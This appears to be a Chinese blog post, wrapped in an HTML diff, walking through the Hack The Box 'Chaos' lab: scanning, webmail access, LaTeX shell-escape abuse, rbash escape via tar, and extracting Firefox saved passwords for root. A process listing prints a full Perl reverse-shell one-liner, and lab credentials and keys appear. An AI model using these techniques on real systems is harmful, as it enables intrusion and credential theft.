@@ -1,0 +1,804 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang>
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="privilege_escalation,wordpress,email,decrypt,latex,rbash,firefox_decrypt,">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="简介这个靶机几乎是全程看writeup打的, 查看加密文章的脑洞有点牵强, 其他内容都很精彩.tips: 只要是密码都要在各种需要的地方尝试使用一下. 靶机状态: 已完成">
+<meta name="keywords" content="privilege_escalation,wordpress,email,decrypt,latex,rbash,firefox_decrypt">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HTB-linux-chaos">
+<meta property="og:url" content="https://exexute.github.io/2019/04/19/HTB-linux-chaos/index.html">
+<meta property="og:site_name" content="owefsad 的博客">
+<meta property="og:description" content="简介这个靶机几乎是全程看writeup打的, 查看加密文章的脑洞有点牵强, 其他内容都很精彩.tips: 只要是密码都要在各种需要的地方尝试使用一下. 靶机状态: 已完成">
+<meta property="og:locale" content="default">
+<meta property="og:image" content="https://exexute.github.io/2019/04/19/HTB-linux-chaos/HTB_linux_chaos_nmap.png">
+<meta property="og:image" content="https://exexute.github.io/2019/04/19/HTB-linux-chaos/HTB_linux_chaos_reverseshell.png">
+<meta property="og:image" content="https://exexute.github.io/2019/04/19/HTB-linux-chaos/HTB_linux_chaos_escape_rbash.png">
+<meta property="og:image" content="https://exexute.github.io/2019/04/19/HTB-linux-chaos/HTB_linux_chaos_firefoxdecrypt.png">
+<meta property="og:image" content="https://exexute.github.io/2019/04/19/HTB-linux-chaos/HTB_linux_chaos_getroot.png">
+<meta property="og:image" content="https://exexute.github.io/2019/04/19/HTB-linux-chaos/HTB_linux_chaos_mysql_rcusers.png">
+<meta property="og:image" content="https://exexute.github.io/2019/04/19/HTB-linux-chaos/HTB_linux_chaos_mysql_wpusers.png">
+<meta property="og:updated_time" content="2022-06-24T14:37:08.044Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="HTB-linux-chaos">
+<meta name="twitter:description" content="简介这个靶机几乎是全程看writeup打的, 查看加密文章的脑洞有点牵强, 其他内容都很精彩.tips: 只要是密码都要在各种需要的地方尝试使用一下. 靶机状态: 已完成">
+<meta name="twitter:image" content="https://exexute.github.io/2019/04/19/HTB-linux-chaos/HTB_linux_chaos_nmap.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"hide","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://exexute.github.io/2019/04/19/HTB-linux-chaos/">
+
+
+
+
+
+  <title>HTB-linux-chaos | owefsad 的博客</title>
+  
+
+
+
+
+
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?2a72b138b6ef81ae123fcd18e91fa843";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="default">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">owefsad 的博客</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            Categories
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            Archives
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://exexute.github.io/2019/04/19/HTB-linux-chaos/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="owefsad">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="owefsad 的博客">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">HTB-linux-chaos</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-04-19T00:25:02+08:00">
+                2019-04-19
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF/" itemprop="url" rel="index">
+                    <span itemprop="name">CTF</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>简介<br>这个靶机几乎是全程看writeup打的, 查看加密文章的脑洞有点牵强, 其他内容都很精彩.<br>tips: 只要是密码都要在各种需要的地方尝试使用一下.</p>
+<p>靶机状态: 已完成<br><a id="more"></a></p>
+<h2 id="文章目录"><a href="#文章目录" class="headerlink" title="文章目录"></a>文章目录</h2><ul>
+<li>80端口转imaps</li>
+<li>decrypt进latex服务</li>
+<li>tar逃逸rbash</li>
+<li>firefox保存密码提取</li>
+</ul>
+<h2 id="80端口转imaps"><a href="#80端口转imaps" class="headerlink" title="80端口转imaps"></a>80端口转imaps</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo nmap -sS -sV 10.10.10.120</span><br></pre></td></tr></table></figure>
+<p><img src="HTB_linux_chaos_nmap.png" alt="nmap"><br>发现http和email两类端口, 其中pop3和imap都是用来收取邮件的, 一般需要凭证, 因此先查看http端口80和10000.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ dirb http://10.10.10.120</span><br></pre></td></tr></table></figure>
+<p>dirb只能单线程扫描, 在htb这种网络环境不好的场景中, 速度格外的慢, 于是考虑使用其他目录爆破工具, 如: gobruster.<br>扫描之后发现<code>wp</code>目录, 访问之后发现是wordpress站点, 其中唯一的一篇文章被加密.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ wpscan --url http://10.10.10.120/wp/wordpress/</span><br></pre></td></tr></table></figure>
+<p><strong>脑洞</strong> 扫描之后发现一个账户<code>human</code>, 于是考虑爆破human的账号, 用<code>rockyou.txt</code>爆破发现字典太大，无法短时间内爆破成功, 后来查writeup发现这里获取的human是wordpress加密文章的密码.</p>
+<p><strong>webmail</strong> 加密文章中写着webmail的用户名和密码, 于是用<code>hydra -l ayush -p jiujitsu pop3://10.10.10.120</code>查看用户名和密码是否正确, 这里通过更换协议发现pop3s和imaps可登陆. 于是准备读取邮件内容继续渗透.</p>
+<h2 id="decrypt进latex服务"><a href="#decrypt进latex服务" class="headerlink" title="decrypt进latex服务"></a>decrypt进latex服务</h2><p>第一步拿到webmail账号后, 开始着手获取邮件(目前唯一的线索), 通过<strong>foxmail客户端</strong>配置imap服务器端地址, 然后在<strong>草稿箱</strong>中找到一封为发出的邮件, 根据邮件内容提示和加密脚本提示, 获取到aes的<strong>IV</strong>参数和密码解密得到真正的邮件内容, 将线索指向一个<strong><a href="chaos.htb/J00_w1ll_f1Nd_n07H1n9_H3r3">url</a></strong>,  由于无其他WEB服务, 因此推测此处需要添加host然后通过域名访问.<br>访问之后获取一个在线生成pdf的服务, 并根据提示找到可用的模版<strong>test3</strong></p>
+<p>最后根据latex执行perl反弹shell命令获取<strong>www-data</strong>权限的shell.</p>
+<h2 id="tar逃逸rbash"><a href="#tar逃逸rbash" class="headerlink" title="tar逃逸rbash"></a>tar逃逸rbash</h2><p><strong>tty</strong> 获得reverse shell后, 首先考虑进入tty中. 经测试可通过python进入tty:<code>python -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot;</code><br><img src="HTB_linux_chaos_reverseshell.png" alt="reverse_shell"></p>
+<p><strong>escape rbash</strong> 经过rbash逃逸的一番尝试, 发现存在<strong>tar</strong>命令可用于逃逸<strong>rbash</strong>, 逃逸命令<code>tar cf /tmp/a.tar html --checkpoint-action=exec=/bin/bash</code><br><img src="HTB_linux_chaos_escape_rbash.png" alt="escape_rbash"></p>
+<h2 id="提权firefix保存的密码"><a href="#提权firefix保存的密码" class="headerlink" title="提权firefix保存的密码"></a>提权firefix保存的密码</h2><p><strong>firefox</strong> 一番信息搜集和尝试之后, 在<strong>/home/ayush/.mozilla</strong>目录中得到保存的密钥<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># https://github.com/unode/firefox_decrypt.git</span></span><br><span class="line">$ python firefox_decrypt.py</span><br></pre></td></tr></table></figure></p>
+<p><img src="HTB_linux_chaos_firefoxdecrypt.png" alt="firefox_decrypt"><br>从firefox中提取到密码之后, 直接用root账号密码尝试登陆系统的linux账号, 成功进入root.</p>
+<p><img src="HTB_linux_chaos_getroot.png" alt="get_root"></p>
+<hr>
+<blockquote>
+<p>个人日常犯傻流程</p>
+</blockquote>
+<p>进入shell之后, 开始信息收集, 包括: 内核、服务、计划任务、配置、文件.<br><strong>内核信息</strong> Linux chaos 4.18.0-12-generic #13-Ubuntu SMP Wed Nov 14 15:17:05 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux<br><strong>服务</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">root       295  0.0  0.0      0     0 ?        I    13:26   0:00 [kworker/u2:31-events_power_efficient]</span><br><span class="line">root       297  0.0  0.0      0     0 ?        I&lt;   13:26   0:00 [kworker/0:1H-kblockd]</span><br><span class="line">root       368  0.0  0.0      0     0 ?        I&lt;   13:26   0:00 [raid5wq]</span><br><span class="line">root       417  0.0  0.0      0     0 ?        S    13:26   0:00 [jbd2/sda2-8]</span><br><span class="line">root       418  0.0  0.0      0     0 ?        I&lt;   13:26   0:00 [ext4-rsv-conver]</span><br><span class="line">root       481  0.0  1.0 131504 10832 ?        Ssl  13:26   0:02 /usr/bin/vmtoolsd</span><br><span class="line">root       486  0.0  2.1  79104 22060 ?        S&lt;s  13:26   0:00 /lib/systemd/systemd-journald</span><br><span class="line">root       502  0.0  0.0      0     0 ?        I&lt;   13:26   0:00 [iscsi_eh]</span><br><span class="line">root       509  0.0  0.1  83324  1608 ?        Ss   13:26   0:00 /sbin/lvmetad -f</span><br><span class="line">root       510  0.0  0.0      0     0 ?        I&lt;   13:26   0:00 [ib-comp-wq]</span><br><span class="line">root       511  0.0  0.0      0     0 ?        I&lt;   13:26   0:00 [ib_mcast]</span><br><span class="line">root       512  0.0  0.0      0     0 ?        I&lt;   13:26   0:00 [ib_nl_sa_wq]</span><br><span class="line">root       515  0.0  0.0      0     0 ?        I&lt;   13:26   0:00 [rdma_cm]</span><br><span class="line">root       525  0.0  0.5  28660  5600 ?        Ss   13:26   0:00 /lib/systemd/systemd-udevd</span><br><span class="line">systemd+   640  0.0  0.5 111848  5732 ?        Ssl  13:26   0:00 /lib/systemd/systemd-timesyncd</span><br><span class="line">systemd+   758  0.0  0.5  39628  5156 ?        Ss   13:26   0:00 /lib/systemd/systemd-networkd</span><br><span class="line">systemd+   806  0.0  0.7  54264  7180 ?        Ss   13:26   0:00 /lib/systemd/systemd-resolved</span><br><span class="line">root       963  0.0  0.2  14788  3008 ?        Ss   13:26   0:00 /usr/sbin/cron -f</span><br><span class="line">daemon     973  0.0  0.2  11772  2124 ?        Ss   13:26   0:00 /usr/sbin/atd -f</span><br><span class="line">syslog     974  0.0  0.4 240716  4840 ?        Ssl  13:26   0:00 /usr/sbin/rsyslogd -n</span><br><span class="line">root       978  0.0  0.9  57212  9364 ?        Ss   13:26   0:00 /usr/bin/VGAuthService</span><br><span class="line">message+   985  0.0  0.4  21520  4176 ?        Ss   13:26   0:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only</span><br><span class="line">root       989  0.0  1.7  45648 17324 ?        Ss   13:26   0:00 /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers</span><br><span class="line">root       993  0.0  0.6 250804  6616 ?        Ssl  13:26   0:00 /usr/lib/accountsservice/accounts-daemon</span><br><span class="line">root      1003  0.0  0.5  38056  5404 ?        Ss   13:26   0:00 /lib/systemd/systemd-logind</span><br><span class="line">root      1010  0.0  0.3   4476  3264 ?        Ss   13:26   0:00 /usr/sbin/dovecot -F</span><br><span class="line">dovecot   1031  0.0  0.1   4052  1096 ?        S    13:26   0:00 dovecot/anvil</span><br><span class="line">root      1032  0.0  0.2   4188  2580 ?        S    13:26   0:00 dovecot/log</span><br><span class="line">root      1048  0.0  0.4   5464  4144 ?        S    13:26   0:00 dovecot/config</span><br><span class="line">root      1060  0.0  2.6 227344 26336 ?        Ss   13:26   0:00 /usr/sbin/apache2 -k start</span><br><span class="line">mysql     1172  0.0 19.1 1129132 192832 ?      Sl   13:26   0:02 /usr/sbin/mysqld --daemonize --pid-file=/run/mysqld/mysqld.pid</span><br><span class="line">root      1177  0.0  0.6 250140  6440 ?        Ssl  13:26   0:00 /usr/lib/policykit-1/polkitd --no-debug</span><br><span class="line">root      1186  0.0  0.1   5784  1684 tty1     Ss+  13:26   0:00 /sbin/agetty -o -p -- \u --noclear tty1 linux</span><br><span class="line">www-data  1352  0.0  3.7 231164 37416 ?        S    13:26   0:00 /usr/sbin/apache2 -k start</span><br><span class="line">root      1391  0.0  2.8  45804 29108 ?        Ss   13:26   0:00 /usr/bin/perl /usr/share/webmin/miniserv.pl /etc/webmin/miniserv.conf</span><br><span class="line">root      1392  0.0  0.3  40636  3876 ?        Ss   13:26   0:00 /usr/lib/postfix/sbin/master -w</span><br><span class="line">postfix   1399  0.0  0.5  41020  5164 ?        S    13:26   0:00 qmgr -l -t unix -u</span><br><span class="line">www-data  1746  0.0  3.0 229068 30520 ?        S    13:28   0:00 /usr/sbin/apache2 -k start</span><br><span class="line">www-data  1840  0.0  3.0 229060 30400 ?        S    13:37   0:00 /usr/sbin/apache2 -k start</span><br><span class="line">www-data  1925  0.0  3.6 231212 36372 ?        S    13:40   0:00 /usr/sbin/apache2 -k start</span><br><span class="line">www-data  2025  0.0  3.2 231112 32604 ?        S    13:49   0:00 /usr/sbin/apache2 -k start</span><br><span class="line">www-data  2109  0.0  3.4 228952 34320 ?        S    13:52   0:00 /usr/sbin/apache2 -k start</span><br><span class="line">www-data  2266  0.0  1.4 228072 14232 ?        S    14:09   0:00 /usr/sbin/apache2 -k start</span><br><span class="line">www-data  2268  0.0  1.3 228072 14128 ?        S    14:09   0:00 /usr/sbin/apache2 -k start</span><br><span class="line">www-data  2270  0.0  1.8 228136 18944 ?        S    14:09   0:00 /usr/sbin/apache2 -k start</span><br><span class="line">www-data  2271  0.0  1.3 227740 13664 ?        S    14:09   0:00 /usr/sbin/apache2 -k start</span><br><span class="line">root      2375  0.0  0.0      0     0 ?        I    14:28   0:00 [kworker/u2:0-events_power_efficient]</span><br><span class="line">postfix   2615  0.0  0.5  40972  5116 ?        S    15:06   0:00 pickup -l -t unix -u -c</span><br><span class="line">www-data  2616  0.0  0.0   2560   812 ?        S    15:07   0:00 sh -c cd /var/www/main/J00_w1ll_f1Nd_n07H1n9_H3r3/compile/ &amp;&amp; /usr/bin/pdflatex --shell-escape 9d75878ba763dc4446a131520284509b.tex</span><br><span class="line">www-data  2617  0.0  2.0 107692 20432 ?        S    15:07   0:00 /usr/bin/pdflatex --shell-escape 9d75878ba763dc4446a131520284509b.tex</span><br><span class="line">www-data  2618  0.0  0.0   2560   816 ?        S    15:07   0:00 sh -c perl -e &apos;use Socket;$i=&quot;10.10.14.107&quot;;$p=2145;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&apos;</span><br><span class="line">www-data  2619  0.0  0.0   2560   812 ?        S    15:07   0:00 /bin/sh -i</span><br><span class="line">root      2702  1.9  0.0      0     0 ?        Z    15:09   0:00 [/usr/share/webm] &lt;defunct&gt;</span><br><span class="line">www-data  2725  0.0  0.2  15984  2700 ?        R    15:09   0:00 ps aux</span><br></pre></td></tr></table></figure></p>
+<p><strong>计划任务</strong> no crontab for www-data、 no crontab for ayush<br><strong>配置</strong> www-data无sudo权限, ayush无sudo权限<br><strong>文件</strong><br>1.其他用户账号中可读文件<code>find /home -perm -004 -type f 2&gt;/dev/null</code>, <strong>无文件</strong></p>
+<ol start="2">
+<li>查看web服务目录下文件的硬编码<code>grep -ri &quot;pass&quot; /var/www/</code><br>在<strong>wp-config.php</strong>文件中找到mysql数据库账号密码: <strong>roundcube / inner[OnCag8</strong>, <strong>**<br>在</strong>/var/www/roundcube/config<strong>目录找到config.inc.php文件中硬编码信息: des_key:</strong>ZcDl5ZmsXAPnaqyxJYVRT9C3<strong>、mysql: </strong>roundcube:inner%5BOnCag8<strong>、mysql_db:</strong>roundcubemail<strong>
+</strong>mysql<strong> 利用上一步找的mysql账号密码进入mysql, 查找对应的数据, 在roundcubemail库的rc_users表中找到</strong>ayush<strong>账号的客户端哈希值</strong>RtiFliMyCQJHsnsS** 在wp库的wp_users中找到human的账号<br><img src="HTB_linux_chaos_mysql_rcusers.png" alt="rc_users"><br><img src="HTB_linux_chaos_mysql_wpusers.png" alt="wp_users"></li>
+</ol>
+<p>这些信息利用到一半都断掉了, 不知道是思路不对还是有些技术不懂, 暂不深入考究.</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/privilege-escalation/" rel="tag"># privilege_escalation</a>
+          
+            <a href="/tags/wordpress/" rel="tag"># wordpress</a>
+          
+            <a href="/tags/email/" rel="tag"># email</a>
+          
+            <a href="/tags/decrypt/" rel="tag"># decrypt</a>
+          
+            <a href="/tags/latex/" rel="tag"># latex</a>
+          
+            <a href="/tags/rbash/" rel="tag"># rbash</a>
+          
+            <a href="/tags/firefox-decrypt/" rel="tag"># firefox_decrypt</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/04/15/HTB-linux-Help/" rel="next" title="HTB_linux_Help">
+                <i class="fa fa-chevron-left"></i> HTB_linux_Help
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2019/04/19/HTB-windows-querier/" rel="prev" title="HTB-windows-querier">
+                HTB-windows-querier <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">owefsad</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">81</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">5</span>
+                  <span class="site-state-item-name">categories</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">164</span>
+                  <span class="site-state-item-name">tags</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/exexute" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="mailto:owefsad@gmail.com" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#文章目录"><span class="nav-number">1.</span> <span class="nav-text">文章目录</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#80端口转imaps"><span class="nav-number">2.</span> <span class="nav-text">80端口转imaps</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#decrypt进latex服务"><span class="nav-number">3.</span> <span class="nav-text">decrypt进latex服务</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#tar逃逸rbash"><span class="nav-number">4.</span> <span class="nav-text">tar逃逸rbash</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#提权firefix保存的密码"><span class="nav-number">5.</span> <span class="nav-text">提权firefix保存的密码</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">owefsad</span>
+
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Mist</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
